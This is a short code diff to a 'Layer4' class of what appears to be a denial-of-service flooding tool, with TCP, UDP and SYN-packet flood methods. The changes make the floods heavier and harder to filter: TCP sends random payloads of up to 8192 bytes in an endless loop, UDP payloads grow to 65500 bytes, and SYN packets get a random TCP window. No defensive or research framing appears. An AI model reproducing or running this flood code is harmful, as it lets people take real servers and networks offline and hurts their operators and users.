@@ -81,14 +81,14 @@ class Layer4:
         else:
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        s.settimeout(.9)
+        s.settimeout(4)
         s.connect(self._target)
         return s
 
     def TCP(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(1024)):
+            while Tools.send(s, randbytes(ProxyTools.Random.rand_int(1024, 8192))):
                 continue
         Tools.safe_close(s)
 
@@ -123,7 +123,7 @@ class Layer4:
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
+            while Tools.sendto(s, randbytes(65500), self._target):
                 continue
         Tools.safe_close(s)
 
@@ -217,6 +217,7 @@ class Layer4:
         tcp.set_th_flags(0x02)
         tcp.set_th_dport(self._target[1])
         tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
+        tcp.set_th_win(ProxyTools.Random.rand_int(1024, 65535))
         ip.contains(tcp)
         return ip.get_packet()
 
